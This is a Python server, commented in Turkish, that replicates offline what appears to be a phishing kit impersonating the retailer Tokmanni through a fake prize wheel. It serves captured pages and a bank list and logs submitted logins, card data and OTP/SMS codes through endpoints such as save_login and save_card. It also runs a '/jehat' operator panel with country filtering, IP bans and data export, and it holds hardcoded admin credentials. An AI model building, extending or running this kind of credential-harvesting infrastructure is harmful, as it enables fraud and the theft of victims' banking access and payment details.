#!/usr/bin/env python3
"""
Tokmanni Offline Clone Server
===============================
Tamamen offline çalışır - orijinal siteye bağlantı gerekmez.
- Public çark sayfası (/wheel, /)
- Admin paneli (/jehat/*)
- Tüm API endpoint'leri yerel JSON'dan servis edilir
- Statik dosyalar yerel kopyadan servis edilir
"""

import os
import re
import json
import time
import uuid
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, unquote, parse_qs
from datetime import datetime

# ============================================
# YAPILANDIRMA
# ============================================
PORT = 8080
ORIGINAL_DOMAIN = "tokmanni.palkintohakemus.fi"

# Yerel dosya kaynakları
SITE_ROOT = "/root/tokmanni.palkintohakemus.fi"
CAPTURED_PAGES = "/root/cark1/site-capture/pages"
PUBLIC_PAGES = "/root/cark1/site-capture/public"
API_DATA = "/root/cark1/api-data"

# Admin giriş bilgileri (offline login için)
ADMIN_USERNAME = "denez"
ADMIN_PASSWORD = "sanane21"

# ============================================
# OFFLINE VERİ DEPOSU
# ============================================
class DataStore:
    """Tüm verileri bellekte tutar, dosyadan yükler"""
    
    def __init__(self):
        self.lock = threading.Lock()
        self.sessions = {}
        self.visitors = []
        self.form_submissions = []
        self.activity_logs = []
        self.api_cache = {}
        self._load_api_data()
    
    def _load_api_data(self):
        if not os.path.isdir(API_DATA):
            return
        for f in os.listdir(API_DATA):
            if f.endswith('.json'):
                fp = os.path.join(API_DATA, f)
                try:
                    with open(fp, 'r') as fh:
                        data = json.load(fh)
                    name = f[:-5]
                    path = '/' + name.replace('_', '/')
                    self.api_cache[path] = data
                    print(f"  [DATA] {path} ({os.path.getsize(fp)}B)")
                except Exception as e:
                    print(f"  [DATA] Error: {f}: {e}")
    
    def create_session(self, username):
        sid = str(uuid.uuid4())
        with self.lock:
            self.sessions[sid] = {
                'username': username,
                'created': time.time(),
                'last_activity': time.time()
            }
        return sid
    
    def validate_session(self, sid):
        if not sid:
            return None
        with self.lock:
            sess = self.sessions.get(sid)
            if sess:
                sess['last_activity'] = time.time()
                return sess
        return None
    
    def add_activity(self, action, description=''):
        with self.lock:
            self.activity_logs.insert(0, {
                'id': str(len(self.activity_logs) + 100),
                'user_id': '6',
                'action': action,
                'description': description,
                'target_table': None,
                'target_id': None,
                'ip_address': '127.0.0.1',
                'user_agent': 'Offline Clone',
                'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            })
    
    def add_form_submission(self, data):
        with self.lock:
            data['id'] = str(len(self.form_submissions) + 1)
            data['created_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            self.form_submissions.append(data)
            print(f"  [FORM] {json.dumps(data, ensure_ascii=False)[:200]}")
        return data


store = DataStore()


# ============================================
# CONTENT TYPE
# ============================================
EXT_MAP = {
    '.html': 'text/html; charset=utf-8',
    '.css': 'text/css; charset=utf-8',
    '.js': 'application/javascript; charset=utf-8',
    '.json': 'application/json; charset=utf-8',
    '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg',
    '.gif': 'image/gif', '.svg': 'image/svg+xml', '.ico': 'image/x-icon',
    '.woff': 'font/woff', '.woff2': 'font/woff2',
    '.ttf': 'font/ttf', '.eot': 'application/vnd.ms-fontobject',
    '.txt': 'text/plain; charset=utf-8',
}

def guess_type(path):
    _, ext = os.path.splitext(path.split('?')[0])
    return EXT_MAP.get(ext.lower(), 'application/octet-stream')


def rewrite_html(content):
    """HTML içindeki orijinal domain URL'lerini relative'e çevir"""
    t = content
    t = t.replace(f'https://{ORIGINAL_DOMAIN}', '')
    t = t.replace(f'http://{ORIGINAL_DOMAIN}', '')
    t = t.replace(ORIGINAL_DOMAIN, '')
    return t


# ============================================
# HANDLER
# ============================================
class OfflineHandler(BaseHTTPRequestHandler):
    
    def _send(self, content, ct, status=200, headers=None):
        if isinstance(content, str):
            content = content.encode('utf-8')
        self.send_response(status)
        self.send_header('Content-Type', ct)
        self.send_header('Content-Length', len(content))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Cache-Control', 'no-cache')
        if headers:
            for k, v in headers.items():
                self.send_header(k, v)
        self.end_headers()
        self.wfile.write(content)
    
    def _json(self, data, status=200):
        self._send(json.dumps(data, ensure_ascii=False), 'application/json; charset=utf-8', status)
    
    def _html_file(self, fp):
        try:
            with open(fp, 'r', encoding='utf-8', errors='replace') as f:
                html = rewrite_html(f.read())
            self._send(html, 'text/html; charset=utf-8')
            return True
        except:
            return False
    
    def _static_file(self, fp):
        try:
            with open(fp, 'rb') as f:
                self._send(f.read(), guess_type(fp))
            return True
        except:
            return False
    
    def _find_static(self, path):
        clean = unquote(path.split('?')[0])
        fp = os.path.join(SITE_ROOT, clean.lstrip('/'))
        if os.path.isfile(fp):
            return fp
        parent = os.path.dirname(fp)
        base = os.path.basename(clean).split('?')[0]
        if os.path.isdir(parent):
            for f in os.listdir(parent):
                if f.split('?')[0] == base:
                    return os.path.join(parent, f)
        return None
    
    def _get_session_id(self):
        for part in self.headers.get('Cookie', '').split(';'):
            p = part.strip()
            if p.startswith('ci_session='):
                return p.split('=', 1)[1]
        return None
    
    # ==========================================
    # GET ROUTING
    # ==========================================
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.end_headers()
    
    def do_GET(self):
        path = unquote(self.path.split('?')[0])
        
        # ----- FAVICON -----
        if path == '/favicon.ico':
            for loc in ['static/img/favicon.png', 'static/assets/img/favicon.png']:
                fp = os.path.join(SITE_ROOT, loc)
                if os.path.isfile(fp):
                    self._static_file(fp); return
            self._send(b'', 'image/x-icon', 404); return
        
        # ----- STATİK DOSYALAR -----
        if path.startswith('/static/'):
            fp = self._find_static(path)
            if fp:
                self._static_file(fp)
            else:
                self._json({'error': 'not found'}, 404)
            return
        
        # ----- PUBLIC: ÇARK SAYFASI -----
        if path in ('/', '/wheel', '/index', '/index.html'):
            wp = os.path.join(PUBLIC_PAGES, 'wheel.html')
            if os.path.isfile(wp):
                self._html_file(wp)
            else:
                self._send('<h1>Wheel page not captured</h1>', 'text/html; charset=utf-8', 404)
            return
        
        # ----- PUBLIC API: /banks -----
        if path == '/banks':
            bank_data = store.api_cache.get('/jehat/listBank', [])
            public_banks = []
            for b in (bank_data if isinstance(bank_data, list) else []):
                # Only return active banks
                if b.get('status') != 'active':
                    continue
                public_banks.append({
                    'id': b.get('id'), 'bank_name': b.get('bank_name'),
                    'logo': b.get('logo'), 'country': b.get('country'),
                    'status': b.get('status'), 'bank_title': b.get('bank_title', ''),
                    'show_password': b.get('show_password', '1'),
                    'input_label_1': b.get('input_label_1'),
                    'input_label_2': b.get('input_label_2'),
                    'login_option': b.get('login_option', '1'),
                    'option_count': b.get('option_count', '0'),
                    'option_name_1': b.get('option_name_1'),
                    'option_name_2': b.get('option_name_2'),
                    'option_name_3': b.get('option_name_3'),
                    'list_login': b.get('list_login'),
                    'login_list_count': b.get('login_list_count'),
                    'login_list_text': b.get('login_list_text'),
                })
            self._json(public_banks); return
        
        # ----- PUBLIC API: /api/* endpoints (wheel page flow) -----
        if path.startswith('/api/'):
            self._handle_public_api(path, 'GET')
            return
        
        # ----- robots.txt -----
        if path == '/robots.txt':
            rp = os.path.join(SITE_ROOT, 'robots.txt')
            if os.path.isfile(rp):
                self._static_file(rp)
            else:
                self._send('User-agent: *\nDisallow: /', 'text/plain')
            return
        
        # ===================================================
        # ADMIN PANEL (/jehat/*)
        # ===================================================
        if not path.startswith('/jehat'):
            self._json({'error': 'not found'}, 404); return
        
        sub = path[6:].strip('/')  # /jehat/ sonrası
        is_xhr = self.headers.get('X-Requested-With') == 'XMLHttpRequest'
        is_accept_json = 'json' in (self.headers.get('Accept', '') or '')
        
        # ----- Login sayfası -----
        if sub in ('', 'login'):
            lp = os.path.join(CAPTURED_PAGES, 'login.html')
            if os.path.isfile(lp):
                self._html_file(lp)
            else:
                self._send('<h1>Login</h1><form method="POST"><input name="username"><input name="password" type="password"><button>Giriş</button></form>', 'text/html; charset=utf-8')
            return
        
        # ----- Logout -----
        if sub == 'logout':
            sid = self._get_session_id()
            if sid:
                store.sessions.pop(sid, None)
            self.send_response(302)
            self.send_header('Location', '/jehat')
            self.send_header('Set-Cookie', 'ci_session=; Path=/; Max-Age=0')
            self.end_headers(); return
        
        # ----- API ENDPOINT'LERİ (JSON yanıt) -----
        api_response = self._handle_admin_api(sub)
        if api_response is not None:
            self._json(api_response); return
        
        # ----- ADMIN HTML SAYFALARI -----
        sid = self._get_session_id()
        sess = store.validate_session(sid)
        if not sess:
            if is_xhr or is_accept_json:
                self._json({'error': 'unauthorized', 'redirect': '/jehat'}, 401)
            else:
                self.send_response(302)
                self.send_header('Location', '/jehat')
                self.end_headers()
            return
        
        # Bilinen HTML sayfaları
        page_map = {
            'dashboard': 'dashboard.html',
            'bank/list': 'bank_list.html',
            'bank/add': 'bank_add.html',
            'onlineUsers': 'onlineUsers.html',
            'wheelSettings': 'wheelSettings.html',
            'countrySettings': 'countrySettings.html',
            'languages/list': 'languages_list.html',
            'userManagement': 'userManagement.html',
            'activityLogs': 'activityLogs.html',
            'bannedList': 'bannedList.html',
            'adminSettings': 'adminSettings.html',
            'export': 'export.html',
            'truncate': 'truncate.html',
        }
        for lang in ['fi', 'se', 'no', 'dk', 'es', 'at', 'au', 'ie', 'hk']:
            page_map[f'languages/edit/{lang}'] = f'languages_edit_{lang}.html'
        
        if sub in page_map:
            fp = os.path.join(CAPTURED_PAGES, page_map[sub])
            if os.path.isfile(fp):
                store.add_activity('page_visit', f'{sub} sayfası ziyaret edildi')
                self._html_file(fp); return
        
        # ----- bank/edit/{id} -----
        bank_edit_match = re.match(r'^bank/edit/(\d+)$', sub)
        if bank_edit_match:
            bank_id = bank_edit_match.group(1)
            bank_data = store.api_cache.get('/jehat/listBank', [])
            bank = next((b for b in (bank_data if isinstance(bank_data, list) else []) if str(b.get('id')) == bank_id), None)
            if bank and is_accept_json:
                self._json({'success': True, 'data': bank}); return
            elif bank:
                # Try to serve bank_add.html as edit page (same form, pre-filled)
                fp = os.path.join(CAPTURED_PAGES, 'bank_add.html')
                if os.path.isfile(fp):
                    self._html_file(fp); return
            self._json({'success': True, 'data': bank or {}}); return
        
        # ----- visitor/{id} veya visitor data -----
        if sub.startswith('visitor'):
            visitor_id = sub.replace('visitor/', '').replace('visitor', '')
            self._json({
                'success': True,
                'data': {
                    'id': visitor_id or '1',
                    'ip': '127.0.0.1',
                    'country': 'FI',
                    'status': 'active',
                    'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'last_activity': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'form_data': {},
                    'bank_data': {},
                }
            }); return
        
        # ----- listBan / banned -----
        if sub in ('listBan', 'listBanned'):
            self._json({'success': True, 'data': []}); return
        
        # ----- dbrow / database rows -----
        if sub == 'dbrow' or sub.startswith('dbrow'):
            self._json({'success': True, 'data': [], 'total': 0}); return
        
        # Bilinmeyen
        self._json({'error': 'not found', 'path': path}, 404)
    
    def _handle_public_api(self, path, method='GET', post_data=None):
        """
        Public API endpoint'leri - çark sayfası (script.js) tarafından kullanılır.
        Endpoint'ler: /api/getRole, /api/start, /api/bankUpdate, /api/save_*
        """
        endpoint = path.replace('/api/', '')
        post_data = post_data or {}
        
        # /api/getRole veya /api/getRoute - kullanıcı rolünü döndürür
        if endpoint.startswith('getRo'):
            self._json({
                'success': True,
                'role': 'user',
                'country': 'finland',
                'status': 'active',
            }); return
        
        # /api/start - oturum başlatma / çark akışı başlangıcı
        if endpoint.startswith('start'):
            visitor_id = str(uuid.uuid4())[:8]
            store.visitors.append({
                'id': visitor_id,
                'time': datetime.now().isoformat(),
                'ip': self.client_address[0]
            })
            self._json({
                'success': True,
                'session_id': visitor_id,
                'status': 'started',
            }); return
        
        # /api/bankUpdate - banka seçimi/güncelleme
        if endpoint.startswith('bankU'):
            store.add_form_submission({
                'type': 'bank_update',
                'data': post_data,
                'time': datetime.now().isoformat()
            })
            self._json({
                'success': True,
                'message': 'Bank updated successfully',
                'status': 'ok'
            }); return
        
        # /api/save_* - form verisi kaydetme (save_data, save_login, save_card vb.)
        if endpoint.startswith('save_'):
            store.add_form_submission({
                'type': endpoint,
                'data': post_data,
                'time': datetime.now().isoformat()
            })
            self._json({
                'success': True,
                'message': 'Data saved successfully',
                'status': 'ok',
                'next_step': True
            }); return
        
        # /api/verify, /api/validate - OTP/SMS doğrulama
        if endpoint in ('verify', 'validate', 'verifyOtp', 'verifySms', 'checkOtp', 'checkSms'):
            self._json({
                'success': True,
                'verified': True,
                'message': 'Verified',
                'status': 'ok'
            }); return
        
        # /api/check, /api/status - durum kontrol
        if endpoint in ('check', 'status', 'getStatus', 'checkStatus'):
            self._json({
                'success': True,
                'status': 'active',
                'step': 1
            }); return
        
        # Catch-all: bilinmeyen API endpoint'leri - loglayıp başarılı döndür
        print(f"  [API] Bilinmeyen endpoint: {path} ({method}) data={json.dumps(post_data)[:200]}")
        store.add_form_submission({
            'type': f'api_{endpoint}',
            'method': method,
            'data': post_data,
            'time': datetime.now().isoformat()
        })
        self._json({
            'success': True,
            'status': 'ok',
            'message': 'OK'
        })
    
    def _handle_admin_api(self, sub):
        """Admin API endpoint'leri - JSON döndürür veya None (HTML sayfası)"""
        
        # Cached API verileri
        api_path = f'/jehat/{sub}'
        if api_path in store.api_cache:
            return store.api_cache[api_path]
        
        # listBank
        if sub == 'listBank':
            return store.api_cache.get('/jehat/listBank', [])
        
        # getOnlineUsers
        if sub == 'getOnlineUsers':
            return {
                'success': True,
                'data': [{
                    'id': '6', 'username': ADMIN_USERNAME,
                    'role': 'super_admin',
                    'last_activity': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'current_ip': '127.0.0.1',
                    'connection_status': 'online'
                }]
            }
        
        # getActivityLogs
        if sub == 'getActivityLogs':
            cached = store.api_cache.get('/jehat/getActivityLogs', {})
            cached_logs = cached.get('data', []) if isinstance(cached, dict) else []
            return {'success': True, 'data': (store.activity_logs + cached_logs)[:100]}
        
        # getAllUsers
        if sub == 'getAllUsers':
            return store.api_cache.get('/jehat/getAllUsers', {'success': True, 'data': []})
        
        # getCountrySettings
        if sub == 'getCountrySettings':
            return store.api_cache.get('/jehat/getCountrySettings',
                {'success': True, 'settings': {'filter_enabled': True, 'allowed_countries': '["TR","FI"]'}})
        
        # Banned
        if sub in ('getBannedList', 'getBanned', 'getBannedUsers'):
            return {'success': True, 'data': []}
        
        # Admin settings
        if sub in ('getAdminSettings', 'getSettings', 'getConfig'):
            return {'success': True, 'data': {
                'site_name': 'Tokmanni', 'site_url': f'http://localhost:{PORT}'
            }}
        
        # Language data
        if sub.startswith('getLanguage') or sub.startswith('getTranslation'):
            return {'success': True, 'data': {}}
        
        # Wheel settings (API olarak)
        if sub == 'getWheelSettings' or sub == 'getWheelData':
            wp = os.path.join(PUBLIC_PAGES, 'wheel.html')
            if os.path.isfile(wp):
                with open(wp, 'r') as f:
                    content = f.read()
                m = re.search(r"var wheelData = JSON\.parse\('(.+?)'\);", content)
                if m:
                    return {'success': True, 'data': json.loads(m.group(1))}
            return {'success': True, 'data': {}}
        
        # Dashboard stats
        if sub in ('getDashboard', 'getDashboardData', 'getDashboardStats', 'getStats'):
            return {'success': True, 'data': {
                'total_visitors': len(store.visitors),
                'total_submissions': len(store.form_submissions),
                'online_users': 1,
            }}
        
        # None = bu bir API değil, HTML sayfası olarak işle
        return None
    
    # ==========================================
    # POST ROUTING
    # ==========================================
    def do_POST(self):
        cl = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(cl) if cl > 0 else b''
        path = unquote(self.path.split('?')[0])
        
        # Parse body
        ct = self.headers.get('Content-Type', '')
        post_data = {}
        if 'urlencoded' in ct:
            for pair in body.decode('utf-8', errors='replace').split('&'):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    post_data[unquote(k)] = unquote(v.replace('+', ' '))
        elif 'json' in ct:
            try: post_data = json.loads(body)
            except: pass
        
        # ----- ADMIN LOGIN -----
        if path in ('/jehat/login', '/jehat'):
            u = post_data.get('username', '')
            p = post_data.get('password', '')
            if u == ADMIN_USERNAME and p == ADMIN_PASSWORD:
                sid = store.create_session(u)
                store.add_activity('login', 'Sisteme giriş yapıldı')
                self.send_response(302)
                self.send_header('Location', '/jehat/dashboard')
                self.send_header('Set-Cookie', f'ci_session={sid}; Path=/')
                self.end_headers()
            else:
                self.send_response(302)
                self.send_header('Location', '/jehat?error=1')
                self.end_headers()
            return
        
        # ----- PUBLIC API: /api/* endpoints (wheel page flow) -----
        if path.startswith('/api/'):
            self._handle_public_api(path, 'POST', post_data)
            return
        
        # ----- PUBLIC FORM SUBMIT -----
        if path in ('/submit', '/process', '/claim', '/wheel/submit'):
            sub = store.add_form_submission(post_data)
            self._json({'success': True, 'id': sub['id']}); return
        
        # ----- ADMIN SAVE API'LERİ -----
        save_endpoints = [
            'saveWheelSettings', 'saveCountrySettings', 'saveBank',
            'saveLanguage', 'saveSettings', 'saveAdminSettings',
            'addBank', 'addUser', 'addAdmin', 'editBank', 'editUser',
            'deleteBank', 'deleteUser', 'deleteBanned',
            'banUser', 'unbanUser', 'banIP',
            'removeCountryFromFilter', 'testIPLocation', 'debugCountryFilter',
            'resetWheel', 'resetWheelSettings',
            'truncateData', 'truncateAll', 'exportData',
        ]
        sub = path.replace('/jehat/', '')
        if sub in save_endpoints:
            store.add_activity(sub, f'{sub} işlemi yapıldı')
            self._json({'success': True, 'message': 'İşlem başarılı'}); return
        
        # ----- API LOG -----
        if path == '/__log_api':
            self._send(b'ok', 'text/plain'); return
        
        # ----- JS ERROR LOG -----
        if path == '/__log_error':
            log_type = post_data.get('type', 'unknown') if isinstance(post_data, dict) else 'unknown'
            if log_type == 'error':
                print(f"  [JS ERROR] {post_data.get('msg', '')} at {post_data.get('url', '')}:{post_data.get('line', '')}:{post_data.get('col', '')}")
                stack = post_data.get('stack', '')
                if stack:
                    for line in str(stack).split('\n')[:3]:
                        print(f"             {line}")
            elif log_type == 'rejection':
                print(f"  [JS REJECTION] {post_data.get('reason', '')}")
                stack = post_data.get('stack', '')
                if stack:
                    for line in str(stack).split('\n')[:3]:
                        print(f"             {line}")
            elif log_type == 'xdata_change':
                print(f"  [ALPINE] x-data changed to: {post_data.get('value', '')}")
            elif log_type == 'fetch':
                print(f"  [FETCH] {post_data.get('method', 'GET')} {post_data.get('url', '')}")
            else:
                print(f"  [LOG] {json.dumps(post_data)[:200]}")
            self._json({'ok': True}); return
        
        # ----- /visitor/* endpoints -----
        if path.startswith('/visitor/'):
            action = path.replace('/visitor/', '')
            if action == 'updateStatus':
                store.add_form_submission({'type': 'visitor_status', 'data': post_data, 'time': datetime.now().isoformat()})
            self._json({'success': True, 'status': 'ok'}); return
        
        # Bilinmeyen POST
        print(f"  [POST CATCH-ALL] {path} data={json.dumps(post_data)[:200]}")
        self._json({'success': True, 'message': 'OK'})
    
    def log_message(self, format, *args):
        msg = format % args if args else format
        if '/static/' not in str(msg):
            print(f"  [{self.log_date_time_string()}] {msg}")


# ============================================
# BAŞLATMA
# ============================================
def main():
    print("=" * 60)
    print("  TOKMANNI OFFLINE CLONE SERVER")
    print(f"  http://localhost:{PORT}")
    print("  Mod: TAMAMEN OFFLINE")
    print("=" * 60)
    
    static_count = sum(len(f) for _, _, f in os.walk(SITE_ROOT)) if os.path.isdir(SITE_ROOT) else 0
    page_count = len([f for f in os.listdir(CAPTURED_PAGES) if f.endswith('.html')]) if os.path.isdir(CAPTURED_PAGES) else 0
    
    print(f"\n  Statik dosyalar: {static_count}")
    print(f"  Admin sayfaları: {page_count}")
    print(f"  API cache: {len(store.api_cache)} endpoint")
    
    auto_sid = store.create_session(ADMIN_USERNAME)
    store.add_activity('system', 'Sunucu başlatıldı')
    
    print(f"\n  [!] Otomatik session oluşturuldu")
    print(f"      Cookie: ci_session={auto_sid}")
    print(f"\n  Çark Sayfası:    http://localhost:{PORT}/")
    print(f"  Admin Login:     http://localhost:{PORT}/jehat")
    print(f"  Admin Dashboard: http://localhost:{PORT}/jehat/dashboard")
    print(f"  Admin: {ADMIN_USERNAME} / {ADMIN_PASSWORD}")
    print(f"\n  Ctrl+C ile durdur.\n")
    
    server = HTTPServer(('0.0.0.0', PORT), OfflineHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n  Sunucu durduruluyor...")
        server.server_close()

if __name__ == '__main__':
    main()
